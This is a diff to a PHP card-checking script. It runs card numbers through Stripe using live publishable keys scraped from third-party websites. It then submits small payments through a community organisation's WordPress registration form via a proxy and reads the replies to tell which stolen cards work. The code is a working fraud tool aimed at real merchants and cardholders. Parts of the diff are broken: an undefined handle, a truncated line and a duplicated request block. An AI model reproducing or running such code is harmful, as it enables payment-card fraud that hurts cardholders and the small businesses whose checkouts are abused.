@@ -325,7 +325,7 @@ Req: <code>@$username</code>
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
-curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'POST /v1/payment_methods h2',
@@ -349,10 +349,44 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=da0023d5-49ac-4f4e-985e-b64fba270f665432e7&muid=bdeb15a6-0298-49de-8b4c-761ed9f5d890e369e5&sid=3651a87b-536e-42d9-b0dc-2791665c1ec051b31a&pasted_fields=number&payment_user_agent=stripe.js%2F5a5928be1f%3B+stripe-js-v3%2F5a5928be1f%3B+card-element&referrer=https%3A%2F%2Fflowersofbethlehem.com.au&time_on_page=139976&key=pk_live_51KquVnKLV2rxHZxolIJm4hF89QKkVuTOxe8RhxZvdUmLtUUEliBg3Ow1lY3UgpJB4ShiGn8IblrZ7bYsom1U18NZ00TdHt6KGl');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=da0023d5-49ac-4f4e-985e-b64fba270f665432e7&muid=5cb26347-4686-49cb-a14a-37ced89e2995344911&sid=15952737-0678-437c-a0bd-bce1e8a43503bf5793&pasted_fields=number&payment_user_agent=stripe.js%2Fdd5a979049%3B+stripe-js-v3%2Fdd5a979049%3B+card-element&referrer=https%3A%2F%2Fkitimatchamber.ca&time_on_page=103523&key=pk_live_51H9xjeDIkxqkmlASwCVYTFTC8ZStel4qZMQf2MzvdpVSHmKVfIYJmOATAgadrVJbYngWNhMEBeQbDkNBFRjWBbu9000PCbBfj1');
 
 $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"id": "','"')));
+
+# -------------------- [2 REQ] -------------------#
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
+curl_setopt($ch, CURLOPT_URL, 'https://kitimatchamber.ca/wp-admin/admin-ajax.php?t=1707359635901');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'POST /wp-admin/admin-ajax.php?t=1707359635901 h2',
+'Host: kitimatchamber.ca',
+'accept: */*',
+'content-type: application/x-www-form-urlencoded; charset=UTF-8',
+'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+'origin: https://kitimatchamber.ca',
+'sec-fetch-site: same-origin',
+'sec-fetch-mode: cors',
+'sec-fetch-dest: empty',
+'referer: https://kitimatchamber.ca/kitimat-night-market-2023-registration/',
+'accept-language: en-US,en;q=0.9',));
+
+# ----------------- [2req Postfields] ---------------------#
+
+curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D1075%26_fluentform_15_fluentformnonce%3D64d3dedc8a%26_wp_http_referer%3D%252Fkitimat-night-market-2023-registration%252F%26input_text%3DNY%26names%255Bfirst_name%255D%3DGloo%26names%255Blast_name%255D%3DSmoke%26email%3Dgloosmoke%2540gmail.com%26phone%3D0817480671%26input_text_1%3DNY%26input_radio%3Dyes%26payment_input%255B%255D%3DJuly%252021st%26custom-payment-amount%3D0.5%26payment_method%3Dstripe%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=15');
+
+
+$result2 = curl_exec($ch);
 
 # -------------------- [2 REQ] -------------------#
 
@@ -365,28 +399,7 @@ curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'POST /wp-admin/admin-ajax.php?t=1707022320526 h2',
-'Host: flowersofbethlehem.com.au',
-'accept: */*',
-'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-'origin: https://flowersofbethlehem.com.au',
-'sec-fetch-site: same-origin',
-'sec-fetch-mode: cors',
-'sec-fetch-dest: empty',
-'referer: https://flowersofbethlehem.com.au/central-coast-florist/',
-'accept-language: en-US,en;q=0.9',));
-
-# ----------------- [2req Postfields] ---------------------#
-
-curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D6083%26_fluentform_5_fluentformnonce%3D8097c61180%26_wp_http_referer%3D%252Fcentral-coast-florist%252F%26email%3Dgloosmoke99%2540gmail.com%26input_text%3D0817480671%26description_2%3DNY%26description%3DNY%26description_3%3DNY%26payment_input_4%255B%255D%3DDelivery%2Bto%2Bour%2Bareas%2B%252410%26payment_method%3Dstripe%26__stripe_payment_method_id%3'.$id.'&action=fluentform_submit&form_id=5');
-
-
-$result2 = curl_exec($ch);
+curl_
 
 //==================req 2 end===============//
 
@@ -404,7 +417,7 @@ if (
     strpos($result2, "Thank you for becoming a member") !== false ||
     strpos($result2, 'Membership confirmed.') !== false ||
     strpos($result2, 'Membership Confirmation') !== false ||
-    strpos($result2, 'Thank you for your order, we have all the information we need.') !== false ||
+    strpos($result2, 'Thank you for registering. We will contact you as soon as we can with more info.') !== false ||
     strpos($result2, 'incorrect_zip') !== false ||
     strpos($result2, 'Success ') !== false ||
     strpos($result2, '"type":"one-time"') !== false ||
